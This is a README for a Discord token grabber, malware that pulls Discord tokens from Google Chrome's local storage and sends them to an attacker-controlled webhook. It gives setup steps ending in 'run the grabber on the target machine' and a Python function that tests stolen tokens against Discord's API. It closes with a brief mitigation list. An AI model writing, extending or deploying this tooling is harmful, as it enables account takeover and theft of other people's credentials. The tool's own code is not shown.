# Discord token grabber

> [!CAUTION]
> **PLEASE read this before forking:** your Discord webhook URL will become public if you commit it to the repository. Revise the code and remove any embedded webhook URLs or tokens before pushing (I thought this doesn't need explaining, but take a look at the forks).

Extracts Discord tokens from Google Chrome's local storage and sends them to a Discord webhook.

## Usage

1. Create a webhook in a Discord channel (channel settings > Integrations > Webhooks).
2. Replace the `YOUR WEBHOOK URL` placeholder in the code with the webhook URL.
3. Run the grabber on the target machine.

## Validating tokens

```python
import requests

def test(token: str) -> None:
    response = requests.get(
        url="https://discord.com/api/v9/users/@me",
        headers={"Authorization": token}
    )
    print(response.json())
```

Requires `requests` (`pip install requests`).

## Limitations

- Chrome only.
- Must be executed on the target machine.
- Large token counts may hit Discord message limits.

## Mitigation

- Change your Discord password to invalidate stolen tokens.
- Don't run untrusted code (should be pretty obvious) or paste things into browser dev tools while logged into Discord.
